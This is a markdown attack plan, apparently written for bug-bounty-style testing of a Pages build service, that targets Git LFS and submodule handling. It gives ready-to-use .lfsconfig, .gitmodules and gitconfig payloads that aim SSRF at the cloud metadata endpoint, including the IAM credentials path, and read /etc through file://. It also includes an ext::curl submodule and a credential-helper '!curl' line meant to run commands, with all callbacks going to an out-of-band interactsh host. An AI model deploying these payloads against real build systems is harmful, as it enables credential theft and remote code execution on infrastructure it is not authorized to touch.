# VECTOR 4: Git LFS SSRF + Submodule Protocol Attack

## Hypothesis
During Pages build, if git processes LFS pointers or submodules, it may make
network requests to attacker-controlled URLs = SSRF. The build environment may
have access to internal services (cloud metadata, internal APIs).

## Test A: LFS pointer to internal service

Create `.gitattributes`:
```
*.dat filter=lfs diff=lfs merge=lfs -text
```

Create a fake LFS pointer file `secret.dat`:
```
version https://git-lfs.github.com/spec/v1
oid sha256:4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393
size 12345
```

Create `.lfsconfig`:
```
[lfs]
url = http://169.254.169.254/latest/meta-data/
```

Also try:
```
[lfs]
url = http://d9mffit1bt6qk4279dh046udjp76xu6qt.oast.pro/lfs-ssrf
```

## Test B: Submodule with file:// protocol

Create `.gitmodules`:
```
[submodule "evil"]
path = evil
url = file:///etc
```

Or for SSRF:
```
[submodule "evil"]
path = evil
url = http://d9mffit1bt6qk4279dh046udjp76xu6qt.oast.pro/submodule-ssrf
```

Or for internal access:
```
[submodule "evil"]
path = evil
url = http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## Test C: Submodule with ext:: protocol (command exec)

```
[submodule "evil"]
path = evil
url = ext::curl https://d9mffit1bt6qk4279dh046udjp76xu6qt.oast.pro/ext-proto?%S%
```

NOTE: ext:: protocol executes commands. If not disabled = RCE.

## Test D: Instead-of URL rewrite via .gitconfig in repo

Create a file that might be picked up as gitconfig:
```
[url "http://d9mffit1bt6qk4279dh046udjp76xu6qt.oast.pro/insteadof"]
insteadOf = https://github.com/
```

## Test E: Git credential helper via .gitattributes

Some git versions process `credential.helper` from repo config.
If the build does `git clone` with our repo's config partially applied:

```
[credential]
helper = !curl https://d9mffit1bt6qk4279dh046udjp76xu6qt.oast.pro/cred-helper
```

## Oracle
ALL callbacks go to: d9mffit1bt6qk4279dh046udjp76xu6qt.oast.pro
Check interactsh log for ANY hit with these paths:
- /lfs-ssrf
- /submodule-ssrf
- /ext-proto
- /insteadof
- /cred-helper

## Kill criteria
- protocol.file.allow != always (file:// blocked)
- protocol.ext.allow != always (ext:: blocked)
- LFS not installed/enabled on build host
- Submodules not initialized during Pages build
- Network egress filtered (no outbound except allowlisted)
